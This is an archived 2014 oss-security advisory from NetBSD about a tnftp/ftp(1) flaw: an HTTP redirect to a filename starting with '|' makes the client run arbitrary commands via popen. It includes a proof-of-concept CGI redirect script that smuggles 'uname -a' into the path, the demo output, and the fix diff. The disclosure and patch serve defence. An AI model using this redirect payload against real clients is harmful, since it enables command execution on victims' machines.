@@ -1,0 +1,205 @@
+
+Date: Tue, 28 Oct 2014 17:50:37 +0100
+From: Alistair Crooks <agc@...bsd.org>
+To: oss-security@...ts.openwall.com
+Cc: security-officer@...bsd.org
+Subject: ftp(1) can be made execute arbitrary commands by malicious webserver
+
+Hi,
+
+Despite being old, tnftp(1) is quite widely used, hence this request.
+
+Could we get a CVE issued for this one, please?
+
+Sorry about the lack of warning, I wasn't aware of the issue before
+the fixes were committed to the repo.
+
+FreeBSD and Dragonfly have been informed, as has Apple, and I have
+received a boilerplate reply from Apple.  The issue is present in
+10.10 (Yosemite).
+
+Thanks,
+Alistair
+---
+Security Officer, NetBSD
+
+
+Just a quick heads-up, and sorry that no notice was given - the issue
+is that a malicious server can cause ftp(1) to execute arbitrary
+commands:
+
+   If you do "ftp http://server/path/file.txt" and don't specify an output
+   filename with -o, the ftp program can be tricked into executing
+   arbitrary commands.
+
+   The FTP client will follow HTTP redirects, and uses the part of the
+   path after the last / from the last resource it accesses as the output
+   filename (as long as -o is not specified).
+
+   After it resolves the output filename, it checks to see if the output
+   filename begins with a "|", and if so, passes the rest to
+   popen(3): http://nxr.netbsd.org/xref/src/usr.bin/ftp/fetch.c#1156
+
+   Here's a simple CGI script that causes ftp to execute "uname -a", the
+   issue is present on both NetBSD 7.99.1 and OSX 10.10:
+
+     a20$ pwd
+     /var/www/cgi-bin
+     a20$ ls -l
+     total 4
+     -rwxr-xr-x  1 root  wheel  159 Oct 14 02:02 redirect
+     -rwxr-xr-x  1 root  wheel  178 Oct 14 01:54 |uname -a
+     a20$ cat redirect
+     #!/bin/sh
+     echo 'Status: 302 Found'
+     echo 'Content-Type: text/html'
+     echo 'Connection: keep-alive'
+     echo 'Location: http://192.168.2.19/cgi-bin/|uname%20-a'
+     echo
+     a20$
+   a20$ ftp http://localhost/cgi-bin/redirect
+   Trying ::1:80 ...
+   ftp: Can't connect to `::1:80': Connection refused
+   Trying 127.0.0.1:80 ...
+   Requesting http://localhost/cgi-bin/redirect
+   Redirected to http://192.168.2.19/cgi-bin/|uname%20-a
+   Requesting http://192.168.2.19/cgi-bin/|uname%20-a
+       32      101.46 KiB/s
+   32 bytes retrieved in 00:00 (78.51 KiB/s)
+   NetBSD a20 7.99.1 NetBSD 7.99.1 (CUBIEBOARD) #113: Sun Oct 26 12:05:36
+   ADT 2014
+   Jared@...ed-PC:/cygdrive/d/netbsd/src/sys/arch/evbarm/compile/obj/CUBIE
+   BOARD evbarm
+   a20$
+
+The issue was found by Jared Mcneill.
+
+Sorry for the lack of notice, I wasn't aware of the issue before fixes
+were committed to the NetBSD repo.  These fixes are attached to this
+mail.
+
+Regards,
+Alistair
+--
+NetBSD Security Officer
+
+Date: Sun, 26 Oct 2014 12:21:59 -0400
+From: Christos Zoulas <christos@...bsd.org>
+To: source-changes-full@...bsd.org
+Subject: CVS commit: src/usr.bin/ftp
+X-Mailer: log_accum
+
+Module Name:	src
+Committed By:	christos
+Date:		Sun Oct 26 16:21:59 UTC 2014
+
+Modified Files:
+	src/usr.bin/ftp: fetch.c
+
+Log Message:
+don't pay attention to special characters if they don't come from the command
+line (from jmcneill)
+
+
+To generate a diff of this commit:
+cvs rdiff -u -r1.205 -r1.206 src/usr.bin/ftp/fetch.c
+
+Please note that diffs are not public domain; they are subject to the
+copyright notices on the relevant files.
+
+
+Modified files:
+
+Index: src/usr.bin/ftp/fetch.c
+diff -u src/usr.bin/ftp/fetch.c:1.205 src/usr.bin/ftp/fetch.c:1.206
+--- src/usr.bin/ftp/fetch.c:1.205	Wed Nov  6 21:06:51 2013
++++ src/usr.bin/ftp/fetch.c	Sun Oct 26 12:21:59 2014
+@@ -1,4 +1,4 @@
+-/*	$NetBSD: fetch.c,v 1.205 2013/11/07 02:06:51 christos Exp $	*/
++/*	$NetBSD: fetch.c,v 1.206 2014/10/26 16:21:59 christos Exp $	*/
+ 
+ /*-
+  * Copyright (c) 1997-2009 The NetBSD Foundation, Inc.
+@@ -34,7 +34,7 @@
+ 
+ #include <sys/cdefs.h>
+ #ifndef lint
+-__RCSID("$NetBSD: fetch.c,v 1.205 2013/11/07 02:06:51 christos Exp $");
++__RCSID("$NetBSD: fetch.c,v 1.206 2014/10/26 16:21:59 christos Exp $");
+ #endif /* not lint */
+ 
+ /*
+@@ -571,7 +571,7 @@ fetch_url(const char *url, const char *p
+ 	url_decode(decodedpath);
+ 
+ 	if (outfile)
+-		savefile = ftp_strdup(outfile);
++		savefile = outfile;
+ 	else {
+ 		cp = strrchr(decodedpath, '/');		/* find savefile */
+ 		if (cp != NULL)
+@@ -595,8 +595,7 @@ fetch_url(const char *url, const char *p
+ 	rangestart = rangeend = entitylen = -1;
+ 	mtime = -1;
+ 	if (restartautofetch) {
+-		if (strcmp(savefile, "-") != 0 && *savefile != '|' &&
+-		    stat(savefile, &sb) == 0)
++		if (stat(savefile, &sb) == 0)
+ 			restart_point = sb.st_size;
+ 	}
+ 	if (urltype == FILE_URL_T) {		/* file:// URLs */
+@@ -1150,18 +1149,26 @@ fetch_url(const char *url, const char *p
+ 		}
+ 	}		/* end of ftp:// or http:// specific setup */
+ 
+-			/* Open the output file. */
+-	if (strcmp(savefile, "-") == 0) {
+-		fout = stdout;
+-	} else if (*savefile == '|') {
+-		oldpipe = xsignal(SIGPIPE, SIG_IGN);
+-		fout = popen(savefile + 1, "w");
+-		if (fout == NULL) {
+-			warn("Can't execute `%s'", savefile + 1);
+-			goto cleanup_fetch_url;
++	/* Open the output file. */
++
++	/*
++	 * Only trust filenames with special meaning if they came from
++	 * the command line
++	 */
++	if (outfile == savefile) {
++		if (strcmp(savefile, "-") == 0) {
++			fout = stdout;
++		} else if (*savefile == '|') {
++			oldpipe = xsignal(SIGPIPE, SIG_IGN);
++			fout = popen(savefile + 1, "w");
++			if (fout == NULL) {
++				warn("Can't execute `%s'", savefile + 1);
++				goto cleanup_fetch_url;
++			}
++			closefunc = pclose;
+ 		}
+-		closefunc = pclose;
+-	} else {
++	}
++	if (fout == NULL) {
+ 		if ((rangeend != -1 && rangeend <= restart_point) ||
+ 		    (rangestart == -1 && filesize != -1 && filesize <= restart_point)) {
+ 			/* already done */
+@@ -1379,7 +1386,8 @@ fetch_url(const char *url, const char *p
+ 		(*closefunc)(fout);
+ 	if (res0)
+ 		freeaddrinfo(res0);
+-	FREEPTR(savefile);
++	if (savefile != outfile)
++		FREEPTR(savefile);
+ 	FREEPTR(uuser);
+ 	if (pass != NULL)
+ 		memset(pass, 0, strlen(pass));
+
+
+
+
+
+
+----- End forwarded message -----
